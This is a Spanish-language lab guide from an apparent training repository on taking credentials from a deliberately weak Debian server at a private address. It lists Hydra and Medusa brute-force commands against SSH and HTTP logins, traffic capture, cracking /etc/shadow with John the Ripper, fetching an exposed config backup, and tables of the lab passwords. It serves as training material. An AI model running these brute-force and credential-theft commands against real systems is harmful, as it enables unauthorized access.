[⬅️ Volver al README principal](../README.md)

---

# Obtención de Credenciales desde Kali Linux

Este documento describe cómo obtener credenciales de las cuentas del servidor Debian (root y c215714n) utilizando ataques de fuerza bruta y otros métodos.

## Paso 1: Fuerza bruta contra SSH con Hydra

Hydra es una herramienta para realizar ataques de fuerza bruta contra múltiples servicios.

```bash
# Ataque de fuerza bruta contra SSH (puerto 22222)
hydra -l root -P /usr/share/wordlists/rockyou.txt -s 22222 -t 4 -vV 192.168.0.36 ssh

# Ataque con usuario específico y contraseña común
hydra -l c215714n -p c215714n123 -s 22222 -vV 192.168.0.36 ssh

# Ataque con lista de usuarios y contraseñas
hydra -L usuarios.txt -P contraseñas.txt -s 22222 -t 4 -vV 192.168.0.36 ssh
```

### Crear listas de usuarios y contraseñas para el laboratorio

```bash
# Crear archivo de usuarios
cat > usuarios.txt << 'EOF'
root
c215714n
admin
user
test
EOF

# Crear archivo de contraseñas débiles comunes
cat > contraseñas.txt << 'EOF'
root123
c215714n123
password
123456
admin
12345678
qwerty
abc123
letmein
monkey
EOF

# Ejecutar hydra con las listas
hydra -L usuarios.txt -P contraseñas.txt -s 22222 -t 4 -vV 192.168.0.36 ssh
```

**Resultado esperado:** Hydra encontrará:
- root / root123
- c215714n / c215714n123

## Paso 2: Fuerza bruta contra SSH con Medusa

```bash
# Medusa contra SSH (puerto 22222)
medusa -h 192.168.0.36 -u root -P contraseñas.txt -M ssh -v 4 -p 22222

# Medusa con lista de usuarios
medusa -h 192.168.0.36 -U usuarios.txt -P contraseñas.txt -M ssh -v 4 -p 22222
```

## Paso 3: Fuerza bruta contra HTTP (Apache)

Si hay alguna autenticación HTTP básica configurada:

```bash
# Hydra contra HTTP Basic Auth
hydra -l admin -P contraseñas.txt -s 80 -vV 192.168.0.36 http-get /

# Hydra contra formulario de login (si existiera)
hydra -l admin -P contraseñas.txt -s 80 -vV 192.168.0.36 http-post-form "/login:user=^USER^&pass=^PASS^:F=invalido"
```

## Paso 4: Captura de tráfico con Wireshark/tcpdump (credenciales en texto plano)

Si se captura tráfico SSH no cifrado o HTTP, las credenciales pueden ir en texto plano:

```bash
# Capturar tráfico en la interfaz de red
tcpdump -i eth0 -w captura-credenciales.pcap host 192.168.0.36

# O usar Wireshark gráficamente
wireshark &
```

Luego analice el archivo .pcap buscando paquetes con credenciales.

**Nota:** SSH cifra el tráfico, por lo que no se verán contraseñas directamente en el captura a menos que haya un ataque de intermediario (MITM).

## Paso 5: Usar John the Ripper para crackear hashes

Si se obtiene acceso al archivo /etc/shadow (requiere privilegios de root):

```bash
# Copiar /etc/shadow y /etc/passwd al atacante (después de obtener acceso root)
# Combinar passwd y shadow en un archivo para John
unshadow /etc/passwd /etc/shadow > hashes.txt

# Crackear con John the Ripper usando wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Mostrar contraseñas crackeadas
john --show hashes.txt
```

## Paso 6: Extraer credenciales de archivos expuestos en el servidor web

Después de encontrar archivos expuestos con dirb/gobuster:

```bash
# Acceder al archivo de configuración expuesto
curl http://192.168.0.36/config.php.bak

# Contenido esperado:
# $db_pass = "Admin123!";
```

## Paso 7: Probar las credenciales obtenidas

Una vez obtenidas las credenciales, verifique acceso:

```bash
# SSH como root (puerto 22222)
ssh -p 22222 root@192.168.0.36
# Contraseña: root123

# SSH como c215714n (puerto 22222)
ssh -p 22222 c215714n@192.168.0.36
# Contraseña: c215714n123
```

## Resumen de ataques de obtención de credenciales

| Herramienta | Objetivo | Comando clave |
|-------------|----------|---------------|
| Hydra | SSH fuerza bruta | `hydra -L usuarios.txt -P contraseñas.txt -s 22222 -vV 192.168.0.36 ssh` |
| Medusa | SSH fuerza bruta | `medusa -h 192.168.0.36 -U usuarios.txt -P contraseñas.txt -M ssh` |
| curl | Archivos web expuestos | `curl http://192.168.0.36/config.php.bak` |
| John the Ripper | Crackear hashes | `john --wordlist=rockyou.txt hashes.txt` |
| tcpdump/Wireshark | Captura de red | `tcpdump -i eth0 -w captura.pcap host 192.168.0.36` |

## Credenciales esperadas para encontrar

| Usuario | Contraseña | Método de obtención |
|---------|-----------|---------------------|
| root | root123 | Hydra / Medusa fuerza bruta SSH |
| c215714n | c215714n123 | Hydra / Medusa fuerza bruta SSH |
| admin | Admin123! | Archivo config.php.bak expuesto en web |
| db_root | DbPass2024! | Archivo /opt/sensibles/contrasenas.txt (requiere root) |

---

[⬅️ Volver al README principal](../README.md)
